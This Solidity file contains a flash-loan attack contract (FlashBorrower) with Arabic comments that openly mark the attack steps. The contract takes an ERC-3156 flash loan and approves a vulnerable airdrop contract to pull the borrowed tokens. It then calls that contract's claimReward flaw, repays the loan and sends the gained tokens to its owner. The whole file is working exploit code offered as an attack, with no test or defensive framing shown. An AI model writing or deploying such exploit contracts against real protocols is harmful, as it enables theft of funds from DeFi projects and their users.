// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IERC3156FlashLender {
    function flashLoan(
        address receiver,
        address token,
        uint256 amount,
        bytes calldata data
    ) external returns (bool);
}

interface IVulnerableAirdrop {
    function claimReward() external;
}

contract FlashBorrower {
    address public owner;
    address public lender;
    address public airdropContract;
    address public tokenAddress;

    constructor(address _lender, address _airdrop, address _token) {
        owner = msg.sender;
        lender = _lender;
        airdropContract = _airdrop;
        tokenAddress = _token;
    }

    function executeAttack(uint256 borrowAmount) external {
        require(msg.sender == owner, "Only owner can attack");
        bytes memory data = abi.encode(borrowAmount);
        
        IERC3156FlashLender(lender).flashLoan(
            address(this),
            tokenAddress,
            borrowAmount,
            data
        );
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        require(msg.sender == lender, "Caller must be the lender");
        require(initiator == address(this), "Initiator must be this contract");

        // 💥 هنا يبدأ الهجوم الفعلي 💥
        // نعطي عقد التوزيعات الإذن لسحب التوكنات منا
        IERC20(token).approve(airdropContract, type(uint256).max);
        // نستدعي دالة المطالبة بالمكافأة (الثغرة)
        IVulnerableAirdrop(airdropContract).claimReward();
        // 💥 هنا ينتهي الهجوم 💥

        uint256 amountToRepay = amount + fee;
        require(IERC20(token).balanceOf(address(this)) >= amountToRepay, "Not enough to repay loan");
        IERC20(token).approve(lender, amountToRepay);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    // دالة لسحب الأرباح بعد انتهاء الهجوم
    function withdrawProfit(address token) external {
        require(msg.sender == owner, "Only owner");
        uint256 balance = IERC20(token).balanceOf(address(this));
        IERC20(token).transfer(owner, balance);
    }
}